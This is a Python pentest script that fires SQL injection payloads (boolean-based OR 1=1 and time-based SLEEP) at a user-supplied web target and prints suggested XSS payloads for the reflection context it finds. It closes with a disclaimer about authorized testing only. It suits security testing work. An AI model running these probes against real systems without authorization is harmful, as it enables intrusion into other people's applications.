import requests
import argparse
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import time
import sys

# --- Helper Functions ---

def parse_request_file(filepath):
    """Parses a raw HTTP request file."""
    with open(filepath, 'r') as f:
        content = f.read()
    
    header_section, _, body = content.partition('\n\n')
    request_lines = header_section.splitlines()
    
    method, path, _ = request_lines[0].split()
    
    headers = {}
    host = ''
    for line in request_lines[1:]:
        key, value = line.split(':', 1)
        headers[key.strip()] = value.strip()
        if key.strip().lower() == 'host':
            host = value.strip()
            
    if not host:
        raise ValueError("Host header is missing in the request file.")
        
    url = f"http://{host}{path}"
    
    return {"method": method, "url": url, "headers": headers, "body": body}


def send_fuzzed_request(session, req_details, payload):
    """Sends a request with the payload, works for both URL and body fuzzing."""
    url = req_details['url']
    body = req_details.get('body', '')
    
    if "FUZZ" in url:
        fuzzed_url = url.replace("FUZZ", payload)
        fuzzed_body = body
    elif body and "FUZZ" in body:
        fuzzed_url = url
        fuzzed_body = body.replace("FUZZ", payload)
    else:
        return None

    return session.request(
        method=req_details['method'],
        url=fuzzed_url,
        data=fuzzed_body.encode('utf-8'),
        headers=req_details['headers']
    )

# --- Testing Modules ---

def test_sql_injection(session, req_details, baseline):
    """Performs low-volume SQLi checks."""
    print("\n--- Starting SQL Injection Tests ---")
    
    payload_true = "' OR 1=1--"
    payload_false = "' OR 1=2--"
    
    try:
        res_true = send_fuzzed_request(session, req_details, payload_true)
        res_false = send_fuzzed_request(session, req_details, payload_false)

        if len(res_true.content) == baseline["content_length"] and len(res_false.content) != baseline["content_length"]:
            print("[+] Potential Boolean-Based SQLi Found!")
            print(f"    Payload used: {payload_true}")
        else:
            print("[-] No Boolean-Based SQLi detected.")
    except Exception as e:
        print(f"[!] Error during Boolean-Based SQLi test: {e}")

    sleep_time = 7
    payload_time = f"' AND SLEEP({sleep_time})--"
    try:
        start_time = time.time()
        send_fuzzed_request(session, req_details, payload_time)
        end_time = time.time()
        if (end_time - start_time) >= sleep_time:
            print("[+] Potential Time-Based SQLi Found!")
            print(f"    Payload used: {payload_time}")
        else:
            print("[-] No Time-Based SQLi detected.")
    except Exception as e:
        print(f"[!] Error during Time-Based SQLi test: {e}")


def test_cross_site_scripting(session, req_details):
    """Performs context-aware XSS check."""
    print("\n--- Starting Cross-Site Scripting (XSS) Test ---")
    
    marker = "DSF7G8H9J0K"
    try:
        response = send_fuzzed_request(session, req_details, marker)
        if not response:
            print("[!] Could not find FUZZ keyword.")
            return

        soup = BeautifulSoup(response.content, 'html.parser')
        
        if soup.find(string=lambda text: marker in str(text)):
            element = soup.find(string=lambda text: marker in str(text))
            parent = element.find_parent()
            
            if parent and parent.name == 'script':
                print("[*] Input is reflected inside a <script> block.")
                print("    Suggested Payload: ';alert('XSS');//")
            elif parent and parent.attrs:
                print("[*] Input is reflected inside an HTML tag attribute.")
                print("    Suggested Payload: '\" onmouseover=alert('XSS') '")
            else:
                print("[*] Input is reflected as HTML text content.")
                print("    Suggested Payload: <script>alert('XSS')</script>")
        else:
            print("[-] Marker not found reflected in the response.")
            
    except Exception as e:
        print(f"[!] Error during XSS test: {e}")

# --- Main Execution ---

def main():
    parser = argparse.ArgumentParser(description="A low-volume, precision pentest script for SQLi and XSS.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Target URL with 'FUZZ' as a placeholder.")
    group.add_argument("-r", "--request_file", help="Path to a text file containing the raw HTTP request.")
    
    args = parser.parse_args()
    
    session = requests.Session()
    session.headers.update({"User-Agent": "PrecisionPentestScript/3.0"})
    
    req_details = {}
    if args.request_file:
        try:
            print(f"[*] Parsing request file: {args.request_file}")
            req_details = parse_request_file(args.request_file)
            session.headers.update(req_details['headers'])
        except Exception as e:
            print(f"[!] Error parsing request file: {e}")
            sys.exit(1)
    else:
        parsed_url = urlparse(args.url)
        req_details = {
            "method": "GET",
            "url": args.url,
            "headers": {"Host": parsed_url.netloc}
        }

    print(f"[*] Target Method: {req_details['method']}")
    print(f"[*] Target URL: {req_details['url'].split('?')[0]}")

    try:
        baseline_resp = send_fuzzed_request(session, req_details, "1")
        if not baseline_resp:
             print("[!] Could not send baseline request. Is 'FUZZ' keyword in the right place?")
             sys.exit(1)
        baseline = {
            "content_length": len(baseline_resp.content),
            "response_time": baseline_resp.elapsed.total_seconds()
        }
    except Exception as e:
        print(f"[!] Error getting baseline: {e}")
        sys.exit(1)

    if baseline:
        print(f"[*] Baseline established: Length={baseline['content_length']}, Time={baseline['response_time']:.2f}s")
        test_sql_injection(session, req_details, baseline)
        test_cross_site_scripting(session, req_details)
    
    print("\n--- Scan Complete ---")
    print("[!] Disclaimer: Only use this script on systems you are explicitly authorized to test.")


if __name__ == "__main__":
    main()
